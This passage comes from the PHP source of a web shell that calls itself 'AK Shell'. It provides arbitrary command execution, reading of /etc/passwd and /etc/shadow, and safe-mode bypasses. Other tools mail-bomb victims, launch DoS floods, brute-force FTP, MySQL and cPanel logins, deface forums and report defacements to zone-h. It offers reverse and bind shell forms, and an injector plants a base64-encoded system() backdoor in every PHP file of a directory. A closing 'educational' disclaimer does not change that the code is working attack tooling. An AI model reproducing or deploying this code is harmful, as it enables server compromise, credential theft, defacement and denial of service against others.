		echo "Cannot Write into File";
    }
    else
    {
        echo "File Name Specified does not exists!";
    }
}
else if(isset($_POST["SendNowToZoneH"]))
{
	$hacker = $_POST['defacer'];
	$method = $_POST['hackmode'];
	$neden = $_POST['reason'];
	$site = $_POST['domain'];
	
	if (empty($hacker))
	{
		die("<center><font  size=3>[-] You Must Fill the Attacker name !</font></center>");
	}
	elseif($method == "--------SELECT--------") 
	{
		die("<center><font  size=3>[-] You Must Select The Method !</center>");
	}
	elseif($neden == "--------SELECT--------") 
	{
		die("<center><font  size=3>[-] You Must Select The Reason</center>");
	}
	elseif(empty($site)) 
	{
		die("<center><font  size=3>[-] You Must Inter the Sites List !</center>");
	}
	// Zone-h Poster
	function ZoneH($url, $hacker, $hackmode,$reson, $site )
	{
		$k = curl_init();
		curl_setopt($k, CURLOPT_URL, $url);
		curl_setopt($k,CURLOPT_POST,true);
		curl_setopt($k, CURLOPT_POSTFIELDS,"defacer=".$hacker."&domain1=". $site."&hackmode=".$hackmode."&reason=".$reson);
		curl_setopt($k,CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($k, CURLOPT_RETURNTRANSFER, true);
		$kubra = curl_exec($k);
		curl_close($k);
		return $kubra;
	}
	
	$i = 0;
    $sites = explode("\n", $site);
    echo "<pre class=ml1 style='margin-top:5px'>";
	while($i < count($sites)) 
	{
		if(substr($sites[$i], 0, 4) != "http") 
		{
				$sites[$i] = "http://".$sites[$i];
		}
		ZoneH("http://zone-h.org/notify/single", $hacker, $method, $neden, $sites[$i]);
		echo "<font class=txt size=3>Site : ".$sites[$i]." Posted !</font><br>";
		++$i;
	}
		 
	echo "<font class=txt size=4>Sending Sites To Zone-H Has Been Completed Successfully !! </font></pre>";
}
else if(isset($_GET['executemycmd']))
{
	$comm = $_GET['executemycmd'];
	chdir($_GET['executepath']);
	echo shell_exec($comm);
}
// View Passwd file
else if(isset($_GET['passwd']))
{
	$test='';
    	$tempp= tempnam($test, "cx");
	$get = "/etc/passwd";
	$name=@posix_getpwuid(@fileowner($get)); 
	$group=@posix_getgrgid(@filegroup($get)); 
	$owner = $name['name']. " / ". $group['name']; 
	?>
	<table style="width:57%;">
            <tr>
                <td align="left">File : </td><td><font class=txt><?php echo $get; ?></font></td><td align="left">Permissions : </td><td><?php echo filepermscolor($get);?></td>
            </tr>
            <tr>
                <td>Size : </td><td><?php echo filesize($get);?></td><td>Owner/Group : </td><td><font class=txt><?php echo $owner;?></font></td> 
            </tr>
        </table>
	<?php
	if(copy("compress.zlib://".$get, $tempp))
	{
		$fopenzo = fopen($tempp, "r");
		$freadz = fread($fopenzo, filesize($tempp));
		fclose($fopenzo);
		$source = htmlspecialchars($freadz);
		echo "<tr><td><center><textarea rows='20' cols='80' class=box name='source'>$source</textarea><br>";
		unlink($tempp);
    	} 
	else 
	{
   	?>
		<form>
			<input type="hidden" name="etcpasswd">
			<table class="tbl" border="1" cellpadding="5" cellspacing="5" align="center" style="width:40%;">
			<tr>
				<td>From : </td><td><input type="text" name="val1" class="sbox" value="1"></td>
			</tr>
			<tr>
				<td>To : </td><td><input type="text" name="val2" class="sbox" value="1000"></td>
			</tr>
			<tr>
				<td colspan="2" align="center"><input type="submit" value="  Go  " class="but"></td>
			</tr>
			</table><br>
		</form>
		<?php 
	}
}
else if(isset($_GET['shadow']))
{
	$test='';
    	$tempp= tempnam($test, "cx");
	$get = "/etc/shadow";
	if(copy("compress.zlib://".$get, $tempp))
	{
		$fopenzo = fopen($tempp, "r");
		$freadz = fread($fopenzo, filesize($tempp));
		fclose($fopenzo);
		$source = htmlspecialchars($freadz);
		echo "<tr><td><center><font size='3' face='Verdana'>$get</font><br><textarea rows='20' cols='80' class=box name='source'>$source</textarea>";
		unlink($tempp);
    	} 
}
else if(isset($_GET['bomb']))
{
	?><div id="showmail"></div>
	<form>
	<table id="margins" style="width:100%;">
		<tr>
			<td style="width:30%;">To</td>
			<td>
				<input class="box" name="to" value="victim@domain.com,victim2@domain.com" onFocus="if(this.value == 'victim@domain.com,victim2@domain.com')this.value = '';" onBlur="if(this.value=='')this.value='victim@domain.com,victim2@domain.com';"/>
			</td>
		</tr>
		<tr>
			<td style="width:30%;">Subject</td>
			<td>
				<input type="text" class="box" name="subject" value="AK Here!" onFocus="if(this.value == 'AK Here!')this.value = '';" onBlur="if(this.value=='')this.value='AK Here!';" />
			</td>
		</tr>
		 <tr>
			<td style="width:30%;">No. of Times</td>
			<td>
				<input class="box" name="times" value="100" onFocus="if(this.value == '100')this.value = '';" onBlur="if(this.value=='')this.value='100';"/>
			</td>
		</tr>
		<tr>
			<td style="width:30%;">Pad your message (Less spam detection)</td>
			<td><input type="checkbox" name="padding"/></td>
		</tr>
		<tr>
			<td colspan="2"><textarea name="message" cols="110" rows="10" class="box">Hello !! This is AK!!</textarea></td>
		</tr>
		<tr>
			<td rowspan="2">
				<input style="margin : 20px; margin-left: 390px; padding : 10px; width: 100px;" type="button" onClick="sendmail('dobombing',to.value,subject.value,message.value,'null',times.value,padding.value)" class="but" value="    Bomb!  "/>
			</td>
		</tr>
	</table>            
	</form>
	<?php
}

//Mass Mailer
else if(isset($_GET['mail']))
{
        ?><div id="showmail"></div>
		<div align="left">
        <form>
           <table align="left" style="width:100%;">
                <tr>
                    <td style="width:10%;">From</td>
                    <td style="width:80%;" align="left"><input name="from" class="box" value="Hello@abcd.in" onFocus="if(this.value == 'president@whitehouse.gov')this.value = '';" onBlur="if(this.value=='')this.value='president@whitehouse.gov';"/></td>
                </tr>
                
                <tr>
                    <td style="width:20%;">To</td>
                    <td style="width:80%;"><input class="box" class="box" name="to" value="victim@domain.com,victim2@domain.com" onFocus="if(this.value == 'victim@domain.com,victim2@domain.com')this.value = '';" onBlur="if(this.value=='')this.value='victim@domain.com,victim2@domain.com';"/></td>
                </tr>
                
                <tr>
                    <td style="width:20%;">Subject</td>
                    <td style="width:80%;"><input type="text" class="box" name="subject" value="AK Here!!" onFocus="if(this.value == 'AK Here!!')this.value = '';" onBlur="if(this.value=='')this.value='AK Here!!';" /></td>
                </tr>
                
                
                <tr>
                    <td colspan="2">
                        <textarea name="message" cols="110" rows="10" class="box">Hello !! This is AK!!!</textarea>
                    </td>
                </tr>
                
                
                <tr>
                    <td rowspan="2">
                        <input style="margin : 20px; margin-left: 390px; padding : 10px; width: 100px;" type="button" onClick="sendmail('massmailing',to.value,subject.value,message.value,from.value)" class="but" value="   Send! "/>
                    </td>
                </tr>
            </table>            
        </form></div>   
        <?php
}
// Get Domains
else if(isset($_REQUEST["symlinkserver"]))
{
	?>
	<center><table><tr>
	<td><a href=javascript:void(0) onClick="getdata('domains')"><font class=txt><b>| Get Domains |</b></font></a></td>
	<td><a href=javascript:void(0) onClick="getdata('symlink')"><font class=txt><b>| Symlink Server |</b></font></a></td>
	<td><a href=javascript:void(0) onClick="getdata('symlinkfile')"><font class=txt><b>| Symlink File |</b></font></a></td>
	<td><a href=javascript:void(0) onClick="getdata('script')"><font class=txt><b>| Script Locator |</b></font></a></td>
	</tr></table></center><br>
	<div id="showdata"></div><?php
}
// Forum Manager
else if(isset($_REQUEST["forum"]))
{ ?>
	<center><table><tr><td><a href=# onClick="getdata('defaceforum')"><font class=txt size="4">| Forum Defacer |</font></a></td>
	<td><a href=# onClick="getdata('passwordchange')"><font class=txt size="4">| Forum Password Changer |</font></a></td>
	</tr></table></center><br><div id="showdata"></div>
	<?php 
}
// Sec info
else if(isset($_GET['secinfo']))
{ ?><div id=showdata></div>
<center><div id="showmydata"></div>
</center>
<br><center><font color =red size=5>Server security information</font><br><br></center>
	<table style="width:100%;border-color:#333333;" border="1">
	<tr>
		<td style="width:7%;">Curl</td>
		<td style="width:7%;">Oracle</td>
		<td style="width:7%;">MySQL</td>
		<td style="width:7%;">MSSQL</td>
		<td style="width:7%;">PostgreSQL</td>
		<td style="width:12%;">Open Base Directory</td>
		<td style="width:10%;">Safe_Exec_Dir</td>
		<td style="width:7%;">PHP Version</td>
		<td style="width:7%;">Magic Quotes</td> 
		<td style="width:7%;">Server Admin</td> 
	</tr>
	<tr>
		<td style="width:7%;"><font class="txt"><?php curlinfo(); ?></font></td>
		<td style="width:7%;"><font class="txt"><?php oracleinfo(); ?></font></td>
		<td style="width:7%;"><font class="txt"><?php mysqlinfo(); ?></font></td>
		<td style="width:7%;"><font class="txt"><?php mssqlinfo(); ?></font></td>
		<td style="width:7%;"><font class="txt"><?php postgresqlinfo(); ?></font></td>
		<td style="width:12%;"><font class="txt"><?php echo $basedir; ?></font></td>
		<td style="width:10%;"><font class="txt"><?php if(@function_exists('ini_get')) { if (''==($df=@ini_get('safe_mode_exec_dir'))) {echo "<font >NONE</font></b>";}else {echo "<font color=green>$df</font></b>";};} ?></font></td>
		<td style="width:7%;"><font class="txt"><?php phpver(); ?></font></td>
		<td style="width:7%;"><font class="txt"><?php magic_quote(); ?></font></td>
		<td style="width:7%;"><font class="txt"><?php serveradmin(); ?></font></td>
	</tr>
</table><br> <?php
	mysecinfo();
}
// Code Injector

else if(isset($_GET['injector']))
{
    ?>
	<form method='POST'>
        <table id="margins">
        <tr>
            <td width="100" class="title">
                        Directory
                    </td>
                    <td>
                         <input class="box" name="pathtomass" value="<?php echo getcwd().$SEPARATOR; ?>" />
                    </td>
					
                </tr>
                <tr>
                <td class="title">
                    Mode
                </td>
                <td>
                        <select style="width: 400px;" name="mode" class="box">
                            <option value="Apender">Apender</option>
                            <option value="Overwriter">Overwriter</option>
                        </select>
                </td>
                </tr>
                <tr>
                    <td class="title">
                        File Type
                    </td>
                    <td>
                        <input type="text" class="box" name="filetype" value="php" onBlur="if(this.value=='')this.value='php';" />
                    </td>
                </tr>
                <tr>
			<td>Create A backdoor by injecting this code in every php file of current directory</td>
		</tr>
                
                <tr>
                    <td colspan="2">
                        <textarea name="injectthis" cols="110" rows="10" class="box"><?php echo base64_decode("PD9waHAgJGNtZCA9IDw8PEVPRA0KY21kDQpFT0Q7DQoNCmlmKGlzc2V0KCRfUkVRVUVTVFskY21kXSkpIHsNCnN5c3RlbSgkX1JFUVVFU1RbJGNtZF0pOyB9ID8+"); ?></textarea>
                    </td>
                </tr>
                <tr>
                    <td rowspan="2">
                        <input style="margin : 20px; margin-left: 390px; padding : 10px; width: 100px;" type="button" onClick="codeinjector(pathtomass.value,mode.value,filetype.value,injectthis.value)" class="but" value="Inject "/>
                    </td>
                </tr>
        </form>
        </table><div id="showinject"</div>
		<?php
}
// Bypass
else if(isset($_GET["bypass"]))
{
	?><center><div id="showbyp"></div></center>
	<table cellpadding="7" align="center" border="3" style="width:70%;border-color:#333333;">
		<tr>
			<td align="center" colspan="2"><font color="#FF0000" size="3">Safe mode bypass</font></td>
		</tr>
		<tr>
			<td align="center">
				<p>Using copy() function</p>
				<form onSubmit="bypassfun('copy',copy.value);return false;">
				<input type="text" name="copy" value="/etc/passwd" class="sbox"> <input type="button" OnClick="bypassfun('copy',copy.value)" value="bypass" class="but">
						</form>
					</td>
					<td align="center">
						<p>Using imap() function</p>
						<form onSubmit="bypassfun('imap',imap.value);return false;">
						<input type="text" name="imap" value="/etc/passwd" class="sbox"> <input type="button" OnClick="bypassfun('imap',imap.value)" value="bypass" class="but">
						</form>
					</td>
				</tr>
						
				<tr>
					<td align="center">
						<p>Using sql() function</p>
						<form onSubmit="bypassfun('sql',sql.value);return false;">
						<input type="text" name="sql" value="/etc/passwd" class="sbox"> <input type="button" OnClick="bypassfun('sql',sql.value)" value="bypass" class="but">
						</form>
					</td>
					<td align="center">
						<p>Using Curl() function</p>
						<form onSubmit="bypassfun('curl',curl.value);return false;">
						<input type="text" name="curl" value="/etc/passwd" class="sbox"> <input type="button" OnClick="bypassfun('curl',curl.value)" value="bypass" class="but">
						</form>
					</td>
				</tr>
						
				<tr>
					<td align="center">
						<p>Bypass using include()</p>
						<form onSubmit="bypassfun('include',include.value);return false;">
						<input type="text" name="include" value="/etc/passwd" class="sbox"> <input type="button" OnClick="bypassfun('include',include.value)" value="bypass" class="but">
						</form>
					</td>
					<td align="center">
						<p>Using id() function</p>
						<form onSubmit="bypassfun('id',id.value);return false;">
						<input type="text" name="id" value="/etc/passwd" class="sbox"> <input type="button" OnClick="bypassfun('id',id.value)" value="bypass" class="but">
						</form>
					</td>
				</tr>
							
				<tr>
					<td align="center">
						<p>Using tempnam() function</p>
						<form onSubmit="bypassfun('tempnam',tempname.value);return false;">
						<input type="text" name="tempname" value="../../../etc/passwd" class="sbox"> <input type="button" OnClick="bypassfun('tempnam',tempname.value)" value="bypass" class="but">
						</form>
					</td>
					<td align="center">
						<p>Using symlink() function</p>
						<form onSubmit="bypassfun('symlnk',sym.value);return false;">
						<input type="text" name="sym" value="/etc/passwd" class="sbox"> <input type="button" OnClick="bypassfun('symlnk',sym.value)" value="bypass" class="but">
					</form>
					</td>
				</tr>
				<tr>
					<td colspan=2 align="center">
						<p>Using Bypass function</p>
						<form onSubmit="bypassfun('newtype',newtype.value,optiontype.value);return false;">
						<input type="text" name="newtype" value="/etc/passwd" class="sbox"> 
						<select id="optiontype" class=sbox>
						<option value="tac">tac</option>
						<option value="more">more</option>
						<option value="less">less</option>
						<option value="rev">rev</option>
						<option value="xxd">xxd</option>
						</select>
						<input type="button" OnClick="bypassfun('newtype',newtype.value,optiontype.value)" value="bypass" class="but">
						</form>
					</td>
				</tr>
		</table>
	</form>
	<?php
}
//fuzzer
else if(isset($_GET['fuzz']))
{
    ?>
        <form method="GET">
           <table id="margins">
                <tr>
                    <td width="400" class="title">
                        IP
                    </td>
                    <td>
                        <input class="box" name="myip" value="127.0.0.1" onFocus="if(this.value == '127.0.0.1')this.value = '';" onBlur="if(this.value=='')this.value='127.0.0.1';"/>
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        Port
                    </td>
                    <td>
                        <input class="box" name="port" value="80" onFocus="if(this.value == '80')this.value = '';" onBlur="if(this.value=='')this.value='80';"/>
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        Timeout
                    </td>
                    <td>
                        <input type="text" class="box" name="time" value="5" onFocus="if(this.value == '5')this.value = '';" onBlur="if(this.value=='')this.value='5';"/>
                    </td>
                </tr>
                
                
                <tr>
                    <td class="title">
                        No of times
                    </td>
                    <td>
                        <input type="text" class="box" name="times" value="100" onFocus="if(this.value == '100')this.value = '';" onBlur="if(this.value=='')this.value='100';" />
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        Message (The message Should be long and it will be multiplied with the value after it)
                    </td>
                    <td>
                        <input class="box" name="message" value="%S%x--Some Garbage here --%x%S" onFocus="if(this.value == '%S%x--Some Garbage here --%x%S')this.value = '';" onBlur="if(this.value=='')this.value='%S%x--Some Garbage here --%x%S';"/>
                    </td>
                    <td>
                        x
                    </td>
                    <td width="20">
                        <input style="width: 30px;" class="box" name="messageMultiplier" value="10" />
                    </td>
                </tr>
                
                <tr>
                    <td rowspan="2">
                        <input style="margin : 20px; margin-left: 500px; padding : 10px; width: 100px;" type="button" onClick="dos('fuzzer',myip.value,port.value,time.value,times.value,message.value,messageMultiplier.value)" class="but" value="  Submit  "/>
                    </td>
                </tr>
            </table>            
        </form><div id="showdos"></div>
        <?php
}
// Zone-h Poster
	else if(isset($_GET["zone"]))
	{  
		if(!function_exists('curl_version'))
		{
			echo "<pre style='margin-top:5px'><center><font >PHP CURL NOT EXIST</font></center></pre>";
		}
		?>
		<center><font size="4" color="#FF0000">Zone-h Poster</font></center>
		<form action="<?php echo $self; ?>" method="post">
		<table align="center" cellpadding="5" border="0">
		<tr>
		<td>
		<input type="text" name="defacer" value="Attacker" class="box" /></td></tr>
		<tr><td>
		<select name="hackmode" class="box">
			<option >--------SELECT--------</option>
			<option value="1">known vulnerability (i.e. unpatched system)</option>
			<option value="2" >undisclosed (new) vulnerability</option>
			<option value="3" >configuration / admin. mistake</option>
			<option value="4" >brute force attack</option>
			<option value="5" >social engineering</option>
			<option value="6" >Web Server intrusion</option>
			<option value="7" >Web Server external module intrusion</option>
			<option value="8" >Mail Server intrusion</option>
			<option value="9" >FTP Server intrusion</option>
			<option value="10" >SSH Server intrusion</option>
			<option value="11" >Telnet Server intrusion</option>
			<option value="12" >RPC Server intrusion</option>
			<option value="13" >Shares misconfiguration</option>
			<option value="14" >Other Server intrusion</option>
			<option value="15" >SQL Injection</option>
			<option value="16" >URL Poisoning</option>
			<option value="17" >File Inclusion</option>
			<option value="18" >Other Web Application bug</option>
			<option value="19" >Remote administrative panel access bruteforcing</option>
			<option value="20" >Remote administrative panel access password guessing</option>
			<option value="21" >Remote administrative panel access social engineering</option>
			<option value="22" >Attack against administrator(password stealing/sniffing)</option>
			<option value="23" >Access credentials through Man In the Middle attack</option>
			<option value="24" >Remote service password guessing</option>
			<option value="25" >Remote service password bruteforce</option>
			<option value="26" >Rerouting after attacking the Firewall</option>
			<option value="27" >Rerouting after attacking the Router</option>
			<option value="28" >DNS attack through social engineering</option>
			<option value="29" >DNS attack through cache poisoning</option>
			<option value="30" >Not available</option>
		</select>
		</td></tr>
		<tr><td>
		<select name="reason" class="box">
			<option >--------SELECT--------</option>
			<option value="1" >Heh...just for fun!</option>
			<option value="2" >Revenge against that website</option>
			<option value="3" >Political reasons</option>
			<option value="4" >As a challenge</option>
			<option value="5" >I just want to be the best defacer</option>
			<option value="6" >Patriotism</option>
			<option value="7" >Not available</option>
		</select></td></tr>
		<tr><td>
		<textarea name="domain" class="box" cols="47" rows="9">List Of Domains</textarea></td></tr>
		<tr><td>
		<input type="button" onClick="zoneh(defacer.value,hackmode.value,reason.value,domain.value)" class="but" value="Send Now !" /></td></tr></table>
		</form><div id="showzone"></div>
	<?php }
//DDos
	else if(isset($_GET['dos']))
	{ 
		?>
			<form method="GET">
				<table id="margins">
					<tr>
						<td width="400" class="title">
							IP
						</td>
						<td>
							<input class="box" name="myip" value="127.0.0.1" onFocus="if(this.value == '127.0.0.1')this.value = '';" onBlur="if(this.value=='')this.value='127.0.0.1';"/>
						</td>
					</tr>
					
					<tr>
						<td class="title">
							Port
						</td>
						<td>
							<input class="box" name="port" value="80" onFocus="if(this.value == '80')this.value = '';" onBlur="if(this.value=='')this.value='80';"/>
						</td>
					</tr>
					
					<tr>
						<td class="title">
							Timeout <font >(Time in seconds)</font>
						</td>
						<td>
							<input type="text" class="box" name="timeout" value="5" onFocus="if(this.value == '5')this.value = '';" onBlur="if(this.value=='')this.value='5';" />
						</td>
					</tr>
					<tr>
				<td class="title">
					Execution Time <font >(Time in seconds)</font> 
				</td>
				<td>
					<input type="text" class="box" name="exTime" value="10" onFocus="if(this.value == '10')this.value = '';" onBlur="if(this.value=='')this.value='10';"/>
				</td>
			</tr>
			<tr>
				<td class="title">
					No of Bytes per/packet
				</td>
				<td>
					<input type="text" class="box" name="noOfBytes" value="999999" onFocus="if(this.value == '999999')this.value = '';" onBlur="if(this.value=='')this.value='999999';"/>
				</td>
			</tr>
			<tr>
				<td rowspan="2">
					<input style="margin : 20px; margin-left: 500px; padding : 10px; width: 100px;" type="button" onClick="dos('dosser',myip.value,port.value,timeout.value,exTime.value,noOfBytes.value,'null')" class="but" value="   Attack >> "/>
				</td>
			</tr>
		</table>            
	</form><div id="showdos"></div>
	<?php
}
else if(isset($_GET['mailbomb']))
{ ?>
	<center><table><tr><td><a href=javascript:void(0) onClick="getdata('bomb')"><font class=txt size="4">| Mail Bomber |</font></a></td>
	<td><a href=javascript:void(0) onClick="getdata('mail')"><font class=txt size="4">| Mass Mailer |</font></a></td></tr></table></center><br><div id=showdata></div>
<?php
}
else if(isset($_GET['tools']))
	{ 
		?>
		<center><br><form onSubmit="getport(host.value,protocol.value);return false;">
		<table cellpadding="5" border="3" style="border-color:#333333; width:50%;">
			<tr>
				<td colspan="2" align="center"><b><font size='4' color="#FF0000">Port Scanner<br></font></b></td>
	   		</tr>
			<tr>
				<td align="center">
	   			<input class="sbox" type='text' name='host' value='<?php echo $_SERVER["SERVER_ADDR"]; ?>' >
				</td>
	   			<td align="center">
				<select class="sbox" name='protocol'>
	   				<option value='tcp'>tcp</option>
	   				<option value='udp'>udp</option>
	   			</select>
				</td>
	   		<tr>
			<td colspan="2" align="center"><input class="but" type='button' onClick="getport(host.value,protocol.value)" value='Scan Ports'></td>
			</tr>
			</form>
			<tr><td colspan=2><div id="showports"></div>
		</td></tr></table>
		
		<br>
		<form onSubmit="bruteforce(prototype.value,serverport.value,login.value,dict.value);return false;">
		<table cellpadding="5" border="2" style="border-color:#333333; width:50%;">
			<tr>
				<td colspan="2" align="center"><font size="4">BruteForce</font></td>
			</tr>
			<tr>
				<td>Type : </td>
				<td>
					<select name="prototype" class="sbox">
						<option value="ftp">FTP</option>
						<option value="mysql">MYSQL</option>
						<option value="postgresql">PostgreSql</option>
					</select>
				</td>
			</tr>
			<tr>
				<td>Server <b>:</b> Port : </td>
				<td><input type="text" name="serverport" value="<?php echo $_SERVER["SERVER_ADDR"]; ?>" class="sbox"></td>
			</tr>
			<tr>
				<td valign="middle">Brute type : </td>
				<td><label><input type=radio name=mytype value="1" checked> /etc/passwd</label><label><input type=checkbox id="reverse" name=reverse value=1 checked> reverse (login -> nigol)</label><hr color="#1B1B1B">
				<label><input type=radio name=mytype value="2"> Dictionary</label><br>
				Login : &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="text" name="login" value="root" class="sbox"><br>
				Dictionary : <input type="text" name="dict" value="<?php echo getcwd() . $directorysperator; ?>passwd.txt" class="sbox">
				</td>
			</tr>
			<tr>
				<td colspan="2" align="center"><input type="button" onClick="bruteforce(prototype.value,serverport.value,login.value,dict.value)" value="Attack >>" class="but"></td>
			</tr>
			</form><tr><td colspan="2" id="showbrute"></td></tr>
		</table>
		</center><br>
		<?php
}
else if (isset($_GET["phpc"]))
{
	 ?>
	 <div id="showresult"></div>
    <form name="frm">
    <textarea name="code" class="box" cols="120" rows="10">phpinfo();</textarea>
	<br /><br />
    <input name="submit" value="Execute This COde! " class="but" onClick="execode(code.value)" type="button" />
	<label><input type="checkbox" id="intext" name="intext" value="disp"> <font class=txt size="3">Display in Textarea</font></label>
    </form>
    <?php
}
else if(isset($_GET["exploit"]))
{
	if(!isset($_GET["rootexploit"]))
	{
		?>
		<center>
		<form action="<?php echo $self; ?>" method="get" target="_blank">
			<input type="hidden" name="exploit">
			<table border="1" cellpadding="5" cellspacing="4" style="width:50%;border-color:#333333;">
			<tr>
				<td style="height:60px;">
			<font size="4" class=txt>Select Website</font></td><td>
		<p><select id="rootexploit" name="rootexploit" class="box">
			<option value="exploit-db">Exploit-db</option>
			<option value="packetstormsecurity">Packetstormsecurity</option>
			<option value="exploitsearch">Exploitsearch</option>
			<option value="shodanhq">Shodanhq</option>
		</select></p></td></tr><tr><td colspan="2" align="center"  style="height:40px;">
		<input type="submit" value="Search" class="but"></td></tr></table>
		</form></center><br>
	
	<?php 
	}
	else
	{
		//exploit search
		$Lversion = php_uname(r);
		$OSV = php_uname(s);
		if(eregi('Linux',$OSV))
		{
			$Lversion=substr($Lversion,0,6);
			if($_GET['rootexploit'] == "exploit-db")
			{
				header("Location:http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=Linux+Kernel+$Lversion");
			}
			else if($_GET['rootexploit'] == "packetstormsecurity")
			{
				header("Location:http://www2.packetstormsecurity.org/cgi-bin/search/search.cgi?searchvalue=Linux+Kernel+$Lversion");
			}
			else if($_GET['rootexploit'] == "exploitsearch")
			{
				header("Location:http://exploitsearch.com/search.html?cx=000255850439926950150%3A_vswux9nmz0&cof=FORID%3A10&q=Linux+Kernel+$Lversion");
			}
			else if($_GET['rootexploit'] == "shodanhq")
			{
				header("Location:http://www.shodanhq.com/exploits?q=Linux+Kernel+$Lversion");
			}
		}
		else
		{
			$Lversion=substr($Lversion,0,3);
			if($_GET['rootexploit'] == "exploit-db")
			{
				header("Location:http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=$OSV+Lversion");
			}
			else if($_GET['rootexploit'] == "packetstormsecurity")
			{
				header("Location:http://www2.packetstormsecurity.org/cgi-bin/search/search.cgi?searchvalue=$OSV+Lversion");
			}
			else if($_GET['rootexploit'] == "exploitsearch")
			{
				header("Location:http://exploitsearch.com/search.html?cx=000255850439926950150%3A_vswux9nmz0&cof=FORID%3A10&q=$OSV+Lversion");
			}
			else if($_GET['rootexploit'] == "shodanhq")
			{
				header("Location:http://www.shodanhq.com/exploits?q=$OSV+Lversion");
			}
		}
		//End of Exploit search
	}
}
// Connect
else if(isset($_REQUEST['connect']))
{
	?>
	<form action='<?php echo $self; ?>' method='POST' >
	<table style="width:50%" align="center" >
    <tr>
        <th colspan="1" width="50px">Reverse Shell</th>
        <th colspan="1" width="50px">Bind Shell</th>
    </tr>
    <tr>
         <td>
            <table style="border-spacing: 6px;">
                <tr>
                    <td>IP </td>
                    <td>
                        <input type="text" class="box" style="width: 200px;" name="ip" value="<?php yourip();?>" />
                    </td>
                </tr>
                <tr>
                    <td>Port </td>
                    <td><input style="width: 200px;" class="box" name="port" size='5' value="9891"/></td>
				</tr>
				<tr>
					<td style="vertical-align:top;">Use:</td>	
					<td><select style="width: 95px;" name="lang" class="sbox">
						<option value="perl">Perl</option>
						<option value="python">Python</option>
						<option value="php">PHP</option>
						</select>&nbsp;&nbsp;
					<input type="submit" style="width: 90px;" class="but" value="Connect!" name="backconnect"/></td>
				</tr>
            </table> </form> 
         </td>
     
         <td style="vertical-align:top;">
		 <form method='post' >
            <table style="border-spacing: 6px;">
                <tr>
                    <td>Port</td>
                    <td>
                        <input style="width: 200px;" class="box" name="port" value="9891" />
                    </td>
                </tr>
                <tr>
                    <td>Password </td>
                    <td>
						<input style="width: 200px;" class="box" name="passwd" value="AK"/>
					</td>
					<tr>
						<td>Using</td>
						<td>
						<select style="width: 95px;" name="lang" id="lang" class="sbox">
						<option value="perl">Perl</option>
						<option value="c">C</option>
						</select>&nbsp;&nbsp;
						<input style="width: 90px;" class="but" type="submit" name="backdoor" value=" Bind "/></td>
                </tr>
            </table>
         </td>
         </form>
    </tr>
	<tr><td colspan=2><font color="#FF0000">Click "Connect" only after open port for it.Use NetCat, run "nc -l -n -v -p 9891"!<br>Click "Bind", use netcat and give it the command 'nc <?php yourip(); ?> 9891"!</font></td></tr>
    </table>
	   
	<?php 
	}

else if(isset($_REQUEST['404']))
{
	?>
	<center><table><tr><td><a href=javascript:void(0) onClick="getdata('404new')"><font class=txt size="4">| Set Your 404 Page |</font></a></td>
		<td><a href=javascript:void(0) onClick="getdata('404page')"><font class=txt size="4">| Set Specified 404 Page |</font></a></td>
		</tr></table></center><br>
		<div id="showdata"></div>
	<?php 
}
else if(isset($_GET['about']))
	{ ?>
		<center>
		  <p><font  size=6><u>D h a n u s h</u></font><br>
		      <font  size=5>[--==Coded By Fanta & Arjun==--]</font>
		    <div style='font-family: Courier New; font-size: 10px;'><font class=txt ><pre>

       -  --  -
       -- -- --
       --    --
       ---  ---
       ------
       ----
   ----             
 ------           
-------          
---   --          
      --      --- 
      --      ----- 
     ---      --- --- 
     ---    ---   ---
--   ---------     --
--    -------      --
 --     ----       --
  --     ---       --
  --     --        --
   ---  ---   --  ---
    ------    ------
     ----      ----
      

		</pre></font></div></center>
		<font class="txt">AK Shell is a PHP Script, created for checking the vulnerability and security of any web server or website. With this PHP script, the owner can check various vulnerablities present in the web server. This shell provide you almost every facility that the security analyst need for penetration testing. This is a "All In One" php script, so that the user do not need to go anywhere else.<br> This script is only coded for education purpose or testing on your own server.The developer of the script is not responsible for any damage or misuse of it</font><br><br><center><font  size=5>Fanta</font><br><font  size=6>| |</font></center><br>
	<?php }
else if(isset($_GET['database']))
{ ?>
	<form onSubmit="mydatabase(server.value,username.value,password.value);return false;">
	<table id="datatable" style="width:90%;" cellpadding="4" align="center">
	<tr>
		<td colspan="2">Connect To Database</td>
	</tr>
	<tr>
		<td>Server Address :</td>
		<td><input type="text" class="box" name="server" value="localhost"></td>
	</tr>
	<tr>
		<td>Username :</td>
		<td><input type="text" class="box" name="username" value="root"></td>
	</tr>
	<tr>
		<td>Password:</td>
		<td><input type="text" class="box" name="password" value=""></td>
	</tr>
	<tr>
		<td></td>
		<td><input type="button" onClick="mydatabase(server.value,username.value,password.value)" value="  Connect  " name="executeit" class="but"></td>
	</tr>
	</table>
	</form>
	<div id="showsql"></div>
<?php	
}
// Cpanel Cracker
	else if(isset($_REQUEST['cpanel']))
	{
		$cpanel_port="2082";
		$connect_timeout=5;
		?>
		<center>
		<form method=post>
		<table style="width:50%;border-color:#333333;" border=1 cellpadding=4>
			<tr>
				<td align=center colspan=2>Target : <input type=text name="server" value="localhost" class=sbox></td>
			</tr>
			<tr>
				<td align=center>User names</td><td align=center>Password</td>
			</tr>
			<tr>
				<td align=center><textarea name=username rows=25 cols=22 class=box><?php 
				if($os != "Windows")
				{
					if(@file('/etc/passwd'))
					{
						$users = file('/etc/passwd');
						foreach($users as $user) 
						{
							$user = explode(':', $user);
							echo $user[0] . "\n";
						}
					}
					else
					{
						$temp = "";
						$val1 = 0;
						$val2 = 1000;
						for(;$val1 <= $val2;$val1++) 
						{
							$uid = @posix_getpwuid($val1);
							if ($uid)
								 $temp .= join(':',$uid)."\n";
						 }
						
						 $temp = trim($temp);
							 
						 if($file5 = fopen("test.txt","w"))
						 {
							fputs($file5,$temp);
							 fclose($file5);
							 
							 $file = fopen("test.txt", "r");
							 while(!feof($file))
							 {
							 	$s = fgets($file);
								$matches = array();
								$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
								$matches = str_replace("home/","",$matches[1]);
